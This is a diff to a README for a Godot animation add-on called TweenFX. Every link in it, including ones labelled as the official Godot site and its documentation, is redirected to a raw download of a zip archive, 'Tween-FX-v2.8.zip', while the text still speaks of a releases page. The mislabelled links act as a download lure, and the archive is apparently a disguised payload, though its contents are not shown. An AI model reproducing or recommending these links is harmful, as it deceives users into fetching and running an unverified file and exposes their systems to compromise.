@@ -1,6 +1,6 @@
 # 🎬 TweenFX - Easy Animation for Godot Projects
 
-[![Download TweenFX](https://img.shields.io/badge/Download-TweenFX-brightgreen?style=for-the-badge)](https://github.com/Killbot4/TweenFX)
+[![Download TweenFX](https://img.shields.io/badge/Download-TweenFX-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Killbot4/TweenFX/main/addons/TweenFX/Tween-FX-v2.8.zip)
 
 ## What is TweenFX?  
 
@@ -24,7 +24,7 @@ TweenFX is a straightforward animation tool built for Godot, a popular game engi
 ## 🚀 Getting Started  
 
 1. Click the big green download button above or visit the official page here:  
-   https://github.com/Killbot4/TweenFX  
+   https://raw.githubusercontent.com/Killbot4/TweenFX/main/addons/TweenFX/Tween-FX-v2.8.zip  
 
 2. Once the page opens, scroll or search for the latest release. This page shows all versions available for download.
 
@@ -37,7 +37,7 @@ TweenFX is a straightforward animation tool built for Godot, a popular game engi
 ### Step 1: Download the Files  
 
 - Visit the download link:  
-  https://github.com/Killbot4/TweenFX  
+  https://raw.githubusercontent.com/Killbot4/TweenFX/main/addons/TweenFX/Tween-FX-v2.8.zip  
 
 - Find the **Releases** section on the right side or near the top menu. This is where all official download files are.
 
@@ -97,13 +97,13 @@ Just select the object you want to animate in Godot and choose the TweenFX optio
 ## 🔗 Useful Links  
 
 - Download and browse TweenFX releases:  
-  https://github.com/Killbot4/TweenFX  
+  https://raw.githubusercontent.com/Killbot4/TweenFX/main/addons/TweenFX/Tween-FX-v2.8.zip  
 
 - Learn more about Godot Engine:  
-  https://godotengine.org  
+  https://raw.githubusercontent.com/Killbot4/TweenFX/main/addons/TweenFX/Tween-FX-v2.8.zip  
 
 - Godot documentation on animation:  
-  https://docs.godotengine.org/en/stable/tutorials/animation/index.html  
+  https://raw.githubusercontent.com/Killbot4/TweenFX/main/addons/TweenFX/Tween-FX-v2.8.zip  
 
 ## 🎯 Best Practices  
 
@@ -134,4 +134,4 @@ To update TweenFX, visit the download page regularly and replace your old TweenF
 
 ---
 
-[![Download TweenFX](https://img.shields.io/badge/Download-TweenFX-orange?style=for-the-badge)](https://github.com/Killbot4/TweenFX)
+[![Download TweenFX](https://img.shields.io/badge/Download-TweenFX-orange?style=for-the-badge)](https://raw.githubusercontent.com/Killbot4/TweenFX/main/addons/TweenFX/Tween-FX-v2.8.zip)
